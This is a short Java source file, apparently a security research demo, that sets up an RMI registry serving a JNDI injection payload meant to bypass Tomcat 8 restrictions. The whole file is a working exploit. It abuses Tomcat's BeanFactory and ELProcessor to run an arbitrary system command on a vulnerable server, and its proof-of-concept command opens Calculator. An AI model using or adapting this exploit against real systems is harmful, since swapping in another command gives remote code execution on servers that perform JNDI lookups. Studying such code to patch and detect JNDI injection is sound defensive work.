package com.dahe.hello.controller.JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Tomcat8Bypass {

     void register() throws Exception {
        try {
            Registry registry = LocateRegistry.createRegistry(2099);
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"open -a Calculator.app\")"));
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
            registry.bind("calc", referenceWrapper);
            System.out.println("Registry运行中......");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        new Tomcat8Bypass().register();
    }
}